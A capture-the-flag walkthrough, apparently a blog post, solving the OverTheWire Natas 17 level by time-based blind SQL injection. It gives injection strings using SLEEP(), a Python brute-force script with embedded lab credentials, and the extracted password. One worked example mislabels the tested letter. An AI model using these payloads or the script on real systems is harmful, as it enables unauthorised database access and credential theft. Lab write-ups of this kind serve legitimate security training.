Continuing with last few challenges' theme, this one is another SQL injection puzzle. Piece of code that matters is the following:<br /><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #007020;">&lt;?</span><br /><br /><span style="color: #60a0b0; font-style: italic;">/*</span><br /><span style="color: #60a0b0; font-style: italic;">CREATE TABLE `users` (</span><br /><span style="color: #60a0b0; font-style: italic;">  `username` varchar(64) DEFAULT NULL,</span><br /><span style="color: #60a0b0; font-style: italic;">  `password` varchar(64) DEFAULT NULL</span><br /><span style="color: #60a0b0; font-style: italic;">);</span><br /><span style="color: #60a0b0; font-style: italic;">*/</span><br /><br /><span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">array_key_exists</span>(<span style="color: #4070a0;">"username"</span>, <span style="color: #bb60d5;">$_REQUEST</span>)) {<br />    <span style="color: #bb60d5;">$link</span> <span style="color: #666666;">=</span> <span style="color: #007020;">mysql_connect</span>(<span style="color: #4070a0;">'localhost'</span>, <span style="color: #4070a0;">'natas17'</span>, <span style="color: #4070a0;">'&lt;censored&gt;'</span>);<br />    <span style="color: #007020;">mysql_select_db</span>(<span style="color: #4070a0;">'natas17'</span>, <span style="color: #bb60d5;">$link</span>);<br />    <br />    <span style="color: #bb60d5;">$query</span> <span style="color: #666666;">=</span> <span style="color: #4070a0;">"SELECT * from users where username=</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;">"</span><span style="color: #666666;">.</span><span style="color: #bb60d5;">$_REQUEST</span>[<span style="color: #4070a0;">"username"</span>]<span style="color: #666666;">.</span><span style="color: #4070a0;">"</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;">"</span>;<br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">array_key_exists</span>(<span style="color: #4070a0;">"debug"</span>, <span style="color: #bb60d5;">$_GET</span>)) {<br />        <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"Executing query: </span><span style="color: #70a0d0; font-style: italic;">$query</span><span style="color: #4070a0;">&lt;br&gt;"</span>;<br />    }<br /><br />    <span style="color: #bb60d5;">$res</span> <span style="color: #666666;">=</span> <span style="color: #007020;">mysql_query</span>(<span style="color: #bb60d5;">$query</span>, <span style="color: #bb60d5;">$link</span>);<br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #bb60d5;">$res</span>) {<br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">mysql_num_rows</span>(<span style="color: #bb60d5;">$res</span>) <span style="color: #666666;">&gt;</span> <span style="color: #40a070;">0</span>) {<br />        <span style="color: #60a0b0; font-style: italic;">//echo "This user exists.&lt;br&gt;";</span><br />    } <span style="color: #007020; font-weight: bold;">else</span> {<br />        <span style="color: #60a0b0; font-style: italic;">//echo "This user doesn't exist.&lt;br&gt;";</span><br />    }<br />    } <span style="color: #007020; font-weight: bold;">else</span> {<br />        <span style="color: #60a0b0; font-style: italic;">//echo "Error in query.&lt;br&gt;";</span><br />    }<br /><br />    <span style="color: #007020;">mysql_close</span>(<span style="color: #bb60d5;">$link</span>);<br />} <span style="color: #007020; font-weight: bold;">else</span> {<br /><span style="color: #007020;">?&gt;</span> <br /></pre></div><br />You'll notice a couple of thing:<br /><ul><li>A table <i>users</i> is created, with 2 fields <i>username </i>and <i>password.</i></li><li>No output is shown for any input you pass.</li></ul>What options do we have here? We won't be able to show error messages, use union based SQL injection since no output exists. How about <a href="https://www.pythian.com/blog/mysql-injection-sleep/">SLEEP()</a>? We can force the SQL statement executed to reveal data by answering yes/no questions. Let's check first if we're able to use the sleep command and some examples to show how we can utilize it. You can use Fiddler as proxy for Windows or Burpsuite for Linux (or whatever tool that does the job) to observe duration.<br /><br /><ul><li><b>Input:</b> <i>natas18" and sleep(5) #</i><br /><b>Query:</b> SELECT * from users where username="<i>natas18" and sleep(5) #</i><br /><b>Output: </b>Overall Elapsed:&nbsp;&nbsp;&nbsp; 0:00:05.384<br /><b>Meaning</b>: User named natas18 exists and sleep(5) <b>was executed</b></li></ul><ul><li><b>Input:</b> <i>idontexist" and sleep(5) #</i><br /><b>Query:</b> SELECT * from users where username="<i>idontexist" and sleep(5) #</i><br /><b>Output: </b>Overall Elapsed:&nbsp;&nbsp;&nbsp; 0:00:00.372<br /><b>Meaning</b>: User named idontexist doesn't exists and sleep(5) <b>was not executed</b></li></ul><ul><li><b>Input:</b> <i>natas18" and password like binary '%a%' and sleep(5) #</i><br /><b>Query:</b> SELECT * from users where username="<i>natas18" and password like binary '%a%' and sleep(5) #</i><br /><b>Output: </b>Overall Elapsed:&nbsp;&nbsp;&nbsp; 0:00:00.359<br /><b>Meaning</b>: password for natas18 does not contain the letter 'a' and sleep(5) <b>was not executed&nbsp;</b></li></ul><ul><li><b>Input:</b> <i>natas18" and password like binary '%d%' and sleep(5) #</i><br /><b>Query:</b> SELECT * from users where username="<i>natas18" and password like binary '%a%' and sleep(5) #</i><br /><b>Output: </b>Overall Elapsed:&nbsp;&nbsp;&nbsp; 0:00:00.359<br /><b>Meaning</b>: password for natas18 <b>does </b>contain the letter 'a' and sleep(5) <b>was executed</b></li></ul>Noticed what happened? By asking the right question, you can get a yes/no depending on the request duration!<br /><br />We'll be using a simple python script to automate the process for us, first by finding the set of characters that exist in password for user natas18 then reconstructing the password.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #007020; font-weight: bold;">import</span> <span style="color: #0e84b5; font-weight: bold;">requests</span><br /><span style="color: #007020; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">requests.auth</span> <span style="color: #007020; font-weight: bold;">import</span> HTTPBasicAuth<br /><br />Auth<span style="color: #666666;">=</span>HTTPBasicAuth(<span style="color: #4070a0;">'natas17'</span>, <span style="color: #4070a0;">'8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'</span>)<br />headers <span style="color: #666666;">=</span> {<span style="color: #4070a0;">'content-type'</span>: <span style="color: #4070a0;">'application/x-www-form-urlencoded'</span>}<br />filteredchars <span style="color: #666666;">=</span> <span style="color: #4070a0;">''</span><br />passwd <span style="color: #666666;">=</span> <span style="color: #4070a0;">''</span><br />allchars <span style="color: #666666;">=</span> <span style="color: #4070a0;">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span><br /><br /><span style="color: #007020; font-weight: bold;">for</span> char <span style="color: #007020; font-weight: bold;">in</span> allchars:<br />        payload <span style="color: #666666;">=</span> <span style="color: #4070a0;">'username=natas18%22+and+password+like+binary+</span><span style="color: #70a0d0; font-style: italic;">%27%</span><span style="color: #4070a0;">25{0}</span><span style="color: #70a0d0; font-style: italic;">%25%</span><span style="color: #4070a0;">27+and+sleep</span><span style="color: #70a0d0; font-style: italic;">%281%</span><span style="color: #4070a0;">29+%23'</span><span style="color: #666666;">.</span>format(char)<br />        r <span style="color: #666666;">=</span> requests<span style="color: #666666;">.</span>post(<span style="color: #4070a0;">'http://natas17.natas.labs.overthewire.org/index.php'</span>, auth<span style="color: #666666;">=</span>Auth, data<span style="color: #666666;">=</span>payload, headers<span style="color: #666666;">=</span>headers)<br />        <span style="color: #007020; font-weight: bold;">if</span>(r<span style="color: #666666;">.</span>elapsed<span style="color: #666666;">.</span>seconds <span style="color: #666666;">&gt;=</span> <span style="color: #40a070;">1</span>):<br />                filteredchars <span style="color: #666666;">=</span> filteredchars <span style="color: #666666;">+</span> char<br />                <span style="color: #007020; font-weight: bold;">print</span>(filteredchars)<br /><br /><span style="color: #007020; font-weight: bold;">print</span>(filteredchars)<br /><br /><span style="color: #007020; font-weight: bold;">for</span> i <span style="color: #007020; font-weight: bold;">in</span> <span style="color: #007020;">range</span>(<span style="color: #40a070;">0</span>,<span style="color: #40a070;">32</span>):<br />        <span style="color: #007020; font-weight: bold;">for</span> char <span style="color: #007020; font-weight: bold;">in</span> filteredchars:<br />                payload <span style="color: #666666;">=</span> <span style="color: #4070a0;">'username=natas18</span><span style="color: #70a0d0; font-style: italic;">%22%</span><span style="color: #4070a0;">20and%20password</span><span style="color: #70a0d0; font-style: italic;">%20li</span><span style="color: #4070a0;">ke%20binary%20</span><span style="color: #4070a0; font-weight: bold;">\'</span><span style="color: #4070a0;">{0}%25</span><span style="color: #4070a0; font-weight: bold;">\'</span><span style="color: #4070a0;">%20and</span><span style="color: #70a0d0; font-style: italic;">%20s</span><span style="color: #4070a0;">leep(1)%23'</span><span style="color: #666666;">.</span>format(passwd <span style="color: #666666;">+</span> char)<br />                r <span style="color: #666666;">=</span> requests<span style="color: #666666;">.</span>post(<span style="color: #4070a0;">'http://natas17.natas.labs.overthewire.org/index.php'</span>, auth<span style="color: #666666;">=</span>Auth, data<span style="color: #666666;">=</span>payload, headers<span style="color: #666666;">=</span>headers)<br />                <span style="color: #007020; font-weight: bold;">if</span>(r<span style="color: #666666;">.</span>elapsed<span style="color: #666666;">.</span>seconds <span style="color: #666666;">&gt;=</span> <span style="color: #40a070;">1</span>):<br />                        passwd <span style="color: #666666;">=</span> passwd <span style="color: #666666;">+</span> char<br />                        <span style="color: #007020; font-weight: bold;">print</span>(passwd)<br />                        <span style="color: #007020; font-weight: bold;">break</span><br /></pre></div><br />Output:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">d<br />dg<br />dgh<br />dghj<br />dghjl<br />dghjlm<br />dghjlmp<br />dghjlmpq<br />dghjlmpqs<br />dghjlmpqsv<br />dghjlmpqsvw<br />dghjlmpqsvwx<br />dghjlmpqsvwxy<br />dghjlmpqsvwxyC<br />dghjlmpqsvwxyCD<br />dghjlmpqsvwxyCDF<br />dghjlmpqsvwxyCDFI<br />dghjlmpqsvwxyCDFIK<br />dghjlmpqsvwxyCDFIKO<br />dghjlmpqsvwxyCDFIKOP<br />dghjlmpqsvwxyCDFIKOPR<br />dghjlmpqsvwxyCDFIKOPR4<br />dghjlmpqsvwxyCDFIKOPR47<br />dghjlmpqsvwxyCDFIKOPR470<br />dghjlmpqsvwxyCDFIKOPR470<br />x<br />xv<br />xvK<br />xvKI<br />xvKIq<br />xvKIqD<br />xvKIqDj<br />xvKIqDjy<br />xvKIqDjy4<br />xvKIqDjy4O<br />xvKIqDjy4OP<br />xvKIqDjy4OPv<br />xvKIqDjy4OPv7<br />xvKIqDjy4OPv7w<br />xvKIqDjy4OPv7wC<br />xvKIqDjy4OPv7wCR<br />xvKIqDjy4OPv7wCRg<br />xvKIqDjy4OPv7wCRgD<br />xvKIqDjy4OPv7wCRgDl<br />xvKIqDjy4OPv7wCRgDlm<br />xvKIqDjy4OPv7wCRgDlmj<br />xvKIqDjy4OPv7wCRgDlmj0<br />xvKIqDjy4OPv7wCRgDlmj0p<br />xvKIqDjy4OPv7wCRgDlmj0pF<br />xvKIqDjy4OPv7wCRgDlmj0pFs<br />xvKIqDjy4OPv7wCRgDlmj0pFsC<br />xvKIqDjy4OPv7wCRgDlmj0pFsCs<br />xvKIqDjy4OPv7wCRgDlmj0pFsCsD<br />xvKIqDjy4OPv7wCRgDlmj0pFsCsDj<br />xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh<br />xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd<br />xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP<br /></pre></div><br /><b>Natas 18 password is xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</b><br /><br /><i>Currently listening to <a href="https://www.youtube.com/watch?v=_2okL15Tuh8">Xasthur - Portal of Sorrow</a></i><br /><ul></ul>